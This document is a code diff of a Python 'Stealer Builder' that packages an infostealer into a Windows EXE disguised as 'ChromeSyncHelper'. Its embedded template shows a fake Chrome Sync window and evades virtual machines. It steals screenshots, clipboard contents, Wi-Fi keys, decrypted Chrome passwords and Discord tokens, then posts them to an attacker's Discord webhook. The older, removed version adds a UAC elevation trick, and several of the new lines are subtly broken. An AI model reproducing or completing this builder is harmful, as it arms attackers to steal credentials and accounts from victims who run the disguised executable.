@@ -5,247 +5,241 @@ import os
 import sys
 import subprocess
 import tkinter as tk
-from tkinter import messagebox
+from tkinter import messagebox, ttk
 import re
 import shutil
 import tempfile
 import secrets
+import textwrap
 
 # =================== AUTO-INSTALL MISSING PACKAGES ===================
 def install_package(package):
-    subprocess.check_call([sys.executable, "-m", "pip", "install", "--quiet", package])
+    subprocess.check_call([sys.executable, "-m", "pip", "install", "--quiet", "--upgrade", package])
 
-required_packages = ["pyinstaller", "pyarmor", "cryptography", "Pillow", "pywin32"]
+required_packages = ["pyinstaller", "cryptography", "Pillow", "pywin32", "requests"]
 
 missing = []
 for pkg in required_packages:
+    pkg_name = pkg.lower()
+    if pkg_name == "pillow": pkg_name = "PIL"
+    elif pkg_name == "pywin32": pkg_name = "win32crypt"
     try:
-        __import__(pkg.lower() if pkg != "pywin32" else "win32crypt")
+        __import__(pkg_name)
     except ImportError:
         missing.append(pkg)
 
 if missing:
-    print(f"Installing missing packages: {', '.join(missing)}")
+    tk.messagebox.showinfo("Installing Dependencies", f"First run detected. Installing: {', '.join(missing)}\nThis will take 30-60s...")
     for pkg in missing:
         install_package(pkg)
-    print("Packages installed. Restarting builder...")
+    tk.messagebox.showinfo("Restart Required", "Dependencies installed. Restarting builder...")
     os.execv(sys.executable, [sys.executable] + sys.argv)
 
-# Now safe to import everything
-import win32crypt
+# Safe imports
+import requests
 from cryptography.hazmat.primitives.ciphers.aead import AESGCM
 from PIL import ImageGrab
-import base64, zlib, marshal, time, random, ctypes, socket, re, json, io
+import win32crypt
+import io
 
-# =================== GUI FOR WEBHOOK INPUT ===================
+# =================== GUI FOR WEBHOOK ===================
 def get_webhook():
     root = tk.Tk()
-    root.title("Malware Builder")
-    root.geometry("400x150")
+    root.title("Stealer Builder v2")
+    root.geometry("500x200")
     root.resizable(False, False)
 
-    tk.Label(root, text="Enter your Discord Webhook URL:").pack(pady=10)
-    webhook_entry = tk.Entry(root, width=50)
+    tk.Label(root, text="Discord Webhook URL:", font=("Arial", 10)).pack(pady=10)
+    webhook_entry = tk.Entry(root, width=70)
     webhook_entry.pack(pady=5)
+
+    progress = ttk.Progressbar(root, mode="indeterminate")
 
     def build():
         webhook = webhook_entry.get().strip()
-        if not re.match(r"https://discord\.com/api/webhooks/\d+/.+", webhook):
-            messagebox.showerror("Error", "Invalid Discord webhook URL. Must be like: https://discord.com/api/webhooks/123/abc")
+        if not webhook or not re.match(r"https://discord(app)?\.com/api/webhooks/\d+/.+", webhook):
+            messagebox.showerror("Invalid Webhook", "Paste a real Discord webhook URL, dumbass.\nExample: https://discord.com/api/webhooks/123456789/abcdefg")
             return
-        root.destroy()
-        generate_malware(webhook)
+        progress.pack(pady=10)
+        progress.start(10)
+        root.update()
+        try:
+            generate_malware(webhook)
+            progress.stop()
+            progress.pack_forget()
+            messagebox.showinfo("Success", f"Build complete!\nEXE saved as: stealer.exe\nTest in a VM before spreading.")
+        except Exception as e:
+            progress.stop()
+            progress.pack_forget()
+            messagebox.showerror("Build Failed", f"Error: {str(e)}\nCheck console for details.")
+        finally:
+            root.destroy()
 
-    tk.Button(root, text="Build EXE", command=build).pack(pady=10)
+    tk.Button(root, text="Build EXE", command=build, bg="green", fg="white", font=("Arial", 10, "bold")).pack(pady=15)
     root.mainloop()
 
-# =================== STEALER TEMPLATE (with placeholders) ===================
-stealer_template = '''
-import base64, zlib, time, os, sys, random, ctypes, socket, subprocess, re, json, secrets, requests
+# =================== STEALER CODE TEMPLATE ===================
+stealer_code = textwrap.dedent('''
+import os, sys, time, random, ctypes, socket, subprocess, re, json, secrets, base64, io, requests, threading
+import tkinter as tk
 from pathlib import Path
 from datetime import datetime
 from cryptography.hazmat.primitives.ciphers.aead import AESGCM
 from PIL import ImageGrab
 import win32crypt
 import shutil
-import io
 
-# UAC Bypass (like Pysilon)
-def uac_bypass():
-    try:
-        import win32com.client
-        shell = win32com.client.Dispatch("WScript.Shell")
-        shell.Run("powershell -windowstyle hidden -command \\"Start-Process cmd.exe /k -Verb RunAs\\"")
-        sys.exit(0)
-    except:
-        pass
+# Fake GUI decoy
+def fake_gui():
+    time.sleep(3)
+    root = tk.Tk()
+    root.title("Google Chrome")
+    root.geometry("400x250")
+    root.resizable(False, False)
+    tk.Label(root, text="Chrome Sync", font=("Segoe UI", 16, "bold"), fg="#4285F4").pack(pady=20)
+    tk.Label(root, text="Syncing your passwords and history...").pack(pady=10)
+    pb = tk.ttk.Progressbar(root, mode="indeterminate", length=300)
+    pb.pack(pady=20)
+    pb.start()
+    tk.Label(root, text="This may take a few moments.", fg="gray").pack()
+    root.attributes("-topmost", True)
+    root.mainloop()
 
-if ctypes.windll.shell32.IsUserAnAdmin() == 0:
-    uac_bypass()
+threading.Thread(target=fake_gui, daemon=True).start()
 
-# Better Anti-VM
 def is_vm():
-    vm_procs = ["vboxservice.exe", "vboxtray.exe", "vmtoolsd.exe", "vgauthservice.exe", "vgtray.exe"]
-    for proc in vm_procs:
-        if subprocess.getoutput(f'tasklist | findstr /i "{proc}"'):
+    bad_procs = ["vboxservice.exe", "vmtoolsd.exe", "vgauthservice.exe"]
+    for p in bad_procs:
+        if "exe" in subprocess.getoutput("tasklist"):
             return True
-    try:
-        c = ctypes.windll.kernel32
-        class M(ctypes.Structure):
-            _fields_ = [("dwLength", ctypes.c_uint32), ("ullTotalPhys", ctypes.c_ulonglong)]
-        m = M(); m.dwLength = ctypes.sizeof(m)
-        c.GlobalMemoryStatusEx(ctypes.byref(m))
-        if m.ullTotalPhys // (1024*1024) < 3999: return True
-    except: pass
-    if os.cpu_count() < 4: return True
+    if ctypes.windll.kernel32.GlobalMemoryStatusEx and ctypes.windll.kernel32.GlobalMemoryStatusEx() < 4*1024*1024*1024:
+        return True
     return False
 
-def _0x2(t=1337):
-    time.sleep((t + random.randint(100, 1000)) / 1000)
-
-def _0x6():
-    try:
-        g = ImageGrab.grab(all_screens=True)
-        b = io.BytesIO()
-        g.save(b, format="PNG")
-        return base64.b64encode(b.getvalue()).decode()
+def grab_screenshot(): 
+    try: 
+        img = ImageGrab.grab(all_screens=True)
+        buf = io.BytesIO()
+        img.save(buf, "PNG")
+        return base64.b64encode(buf.getvalue()).decode()
     except: return ""
 
-def _0x7():
-    try:
-        r = subprocess.run(["powershell", "-noprofile", "-Command", "Get-Clipboard"], capture_output=True, text=True)
-        return r.stdout.strip()
+def grab_clipboard():
+    try: return subprocess.check_output("powershell Get-Clipboard", text=True).strip()
     except: return ""
 
-def _0x8(): return socket.gethostname()
-
-def _0x9():
-    w = []
+def grab_wifi():
+    wifi = []
     try:
-        o = subprocess.check_output(["netsh", "wlan", "show", "profiles"], text=True, stderr=subprocess.DEVNULL)
-        p = re.findall(r"All User Profile\s*:\s*(.+)", o)
-        for n in p:
-            n = n.strip()
-            o2 = subprocess.check_output(["netsh", "wlan", "show", "profile", n, "key=clear"], text=True, stderr=subprocess.DEVNULL)
-            k = re.search(r"Key Content\s*:\s*(.+)", o2)
-            if k: w.append({"ssid": n, "pass": k.group(1).strip()})
+        profiles = re.findall(r"All User Profile\\s+:\\s+(.*)", subprocess.check_output("netsh wlan show profiles", text=True))
+        for p in profiles:
+            p = p.strip()
+            out = subprocess.check_output(f'netsh wlan show profile "{p}" key=clear', text=True)
+            key = re.search(r"Key Content\\s+:\\s+(.*)", out)
+            if key: wifi.append({"ssid": p, "pass": key.group(1).strip()})
     except: pass
-    return w
+    return wifi
 
-def _0x10():
-    c = []
-    if sys.platform != "win32": return c
-    a = os.getenv("LOCALAPPDATA")
-    if not a: return c
-    ls = Path(a) / "Google" / "Chrome" / "User Data" / "Local State"
-    ld = Path(a) / "Google" / "Chrome" / "User Data" / "Default" / "Login Data"
-    if not ls.exists() or not ld.exists(): return c
+def grab_chrome_pw():
+    creds = []
+    appdata = os.getenv("LOCALAPPDATA")
+    if not appdata: return creds
+    ls_path = Path(appdata) / "Google/Chrome/User Data/Local State"
+    db_path = Path(appdata) / "Google/Chrome/User Data/Default/Login Data"
+    if not ls_path.exists() or not db_path.exists(): return creds
     try:
-        with open(ls, "r", encoding="utf-8") as f:
-            s = json.load(f)
-        ek = base64.b64decode(s["os_crypt"]["encrypted_key"])[5:]
-        mk = win32crypt.CryptUnprotectData(ek, None, None, None, 0)[1]
-        td = Path(os.getenv("TEMP")) / f"{secrets.token_hex(8)}.db"
-        shutil.copy(ld, td)
-        import sqlite3
-        conn = sqlite3.connect(str(td))
-        cur = conn.cursor()
-        cur.execute("SELECT origin_url, username_value, password_value FROM logins")
-        for url, user, ep in cur.fetchall():
-            if ep[:3] not in (b"v10", b"v11"): continue
-            nonce, ct, tag = ep[3:15], ep[15:-16], ep[-16:]
-            pt = AESGCM(mk).decrypt(nonce, ct + tag, None)
-            c.append({"url": url, "username": user, "password": pt.decode(errors="ignore")})
+        import json, sqlite3
+        master_key = win32crypt.CryptUnprotectData(base64.b64decode(json.load(open(ls_path))["os_crypt"]["encrypted_key"])[5:])[1]
+        tmp_db = Path(os.getenv("TEMP")) / f"tmp{secrets.token_hex(4)}.db"
+        shutil.copy(db_path, tmp_db)
+        conn = sqlite3.connect(str(tmp_db))
+        for row in conn.execute("SELECT origin_url, username_value, password_value FROM logins"):
+            url, user, enc_pw = row
+            if not enc_pw.startswith(b"v10") and not enc_pw.startswith(b"v11"): continue
+            nonce, ct, tag = enc_pw[3:15], enc_pw[15:-16], enc_pw[-16:]
+            pw = AESGCM(master_key).decrypt(nonce, ct + tag, None).decode(errors="ignore")
+            creds.append({"url": url, "user": user, "pass": pw})
         conn.close()
-        os.unlink(td)
+        os.remove(tmp_db)
     except: pass
-    return c
+    return creds
 
-def _0x11():
-    t = set()
-    paths = [
-        Path(os.getenv("APPDATA")) / "discord" / "Local Storage" / "leveldb",
-        Path(os.getenv("APPDATA")) / "discordcanary" / "Local Storage" / "leveldb",
-        Path(os.getenv("APPDATA")) / "discordptb" / "Local Storage" / "leveldb",
-    ]
-    pat = r"[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27,}"
+def grab_discord():
+    tokens = set()
+    paths = [Path(os.getenv("APPDATA")) / d / "Local Storage/leveldb" for d in ["discord", "discordcanary", "discordptb"]]
     for p in paths:
         if not p.exists(): continue
-        for f in list(p.glob("*.ldb")) + list(p.glob("*.log")):
+        for f in p.glob("*.*db") + p.glob("*.log"):
             try:
-                with open(f, "r", errors="ignore") as fh:
-                    for m in re.finditer(pat, fh.read()):
-                        t.add(m.group())
+                data = open(f, "r", errors="ignore").read()
+                tokens.update(re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{27,}", data))
             except: pass
-    return list(t)
+    return list(tokens)
 
-# Exfil to webhook
 def exfil(data, webhook):
-    key = os.urandom(32)
-    nonce = os.urandom(12)
-    aes = AESGCM(key)
-    enc_data = aes.encrypt(nonce, json.dumps(data).encode(), None)
-    payload = base64.b64encode(nonce + enc_data).decode()
-    headers = {"X-Key": base64.b64encode(key).decode()}
+    key = secrets.token_bytes(32)
+    nonce = secrets.token_bytes(12)
+    cipher = AESGCM(key)
+    ct = cipher.encrypt(nonce, json.dumps(data).encode(), None)
+    payload = base64.b64encode(nonce + ct).decode()
     try:
-        requests.post(webhook, data={"content": payload}, headers=headers, timeout=10)
-    except:
-        pass
+        requests.post(webhook, json={"content": payload}, headers={"X-Enc-Key": base64.b64encode(key).decode()}, timeout=15)
+    except: pass
 
-def run():
-    if is_vm():
-        time.sleep(1800)
-    data = {
-        "info": {
-            "hostname": _0x8(),
-            "screenshot": _0x6(),
-            "clipboard": _0x7(),
-            "wifi": _0x9(),
-            "timestamp": datetime.utcnow().isoformat()
-        },
-        "creds": {
-            "browser_passwords": _0x10(),
-            "discord_tokens": _0x11()
-        }
-    }
-    exfil(data, "{webhook}")
-    while True:
-        time.sleep(86400)
+if is_vm():
+    time.sleep(1800)
 
-run()
-'''
+data = {
+    "hostname": socket.gethostname(),
+    "screenshot": grab_screenshot(),
+    "clipboard": grab_clipboard(),
+    "wifi": grab_wifi(),
+    "chrome_passwords": grab_chrome_pw(),
+    "discord_tokens": grab_discord(),
+    "time": datetime.utcnow().isoformat()
+}
 
-# =================== GENERATE MALWARE EXE ===================
+exfil(data, "{WEBHOOK_PLACEHOLDER}")
+
+while True:
+    time.sleep(86400)
+''')
+
+# =================== BUILD FUNCTION ===================
 def generate_malware(webhook):
-    try:
-        # Write template with webhook
-        code = stealer_template.replace("{webhook}", webhook)
-        
-        # Temp dir for build
-        temp_dir = tempfile.mkdtemp()
-        script_path = os.path.join(temp_dir, "stealer.py")
-        with open(script_path, "w") as f:
-            f.write(code)
-        
-        # Obfuscate and pack with pyarmor + pyinstaller
-        # Pyarmor packs to EXE directly
-        output_exe = "stealer.exe"
-        subprocess.check_call([
-            "pyarmor", "pack",
-            "-e", "--onefile --noconsole --icon NONE",  # Spoof icon if you have one: --icon fake.ico
-            script_path,
-            "-n", output_exe
-        ])
-        
-        # Clean up
-        shutil.rmtree(temp_dir)
-        
-        print(f"Malware built: {os.path.abspath(output_exe)}")
-        messagebox.showinfo("Success", f"EXE generated: {output_exe}\nTest in VM. Exfil to {webhook}")
-    except Exception as e:
-        messagebox.showerror("Error", f"Build failed: {str(e)}")
-        sys.exit(1)
+    temp_dir = tempfile.mkdtemp()
+    script_path = os.path.join(temp_dir, "main.py")
+    
+    # Embed webhook
+    final_code = stealer_code.replace("{WEBHOOK_PLACEHOLDER}", webhook)
+    
+    with open(script_path, "w", encoding="utf-8") as f:
+        f.write(final_code)
+    
+    # PyInstaller command - FIXED
+    build_cmd = [
+        "pyinstaller",
+        "--onefile",
+        "--noconsole",
+        "--noupx",  # remove --noupx if you want compression
+        "--name", "ChromeSyncHelper",  # legit-looking name
+        script_path
+    ]
+    
+    print(f"Running: {' '.join(build_cmd)}")
+    result = subprocess.run(build_cmd, cwd=temp_dir, capture_output=True, text=True)
+    
+    if result.returncode != 0:
+        raise Exception(f"PyInstaller failed:\n{result.stderr}")
+    
+    built_exe = os.path.join(temp_dir, "dist", "ChromeSyncHelper.exe")
+    final_exe = os.path.abspath("stealer.exe")
+    shutil.copyfile(built_exe, final_exe)
+    
+    # Cleanup
+    shutil.rmtree(temp_dir, ignore_errors=True)
+    
+    print(f"EXE built successfully: {final_exe}")
 
-# Run the builder
 if __name__ == "__main__":
     get_webhook()
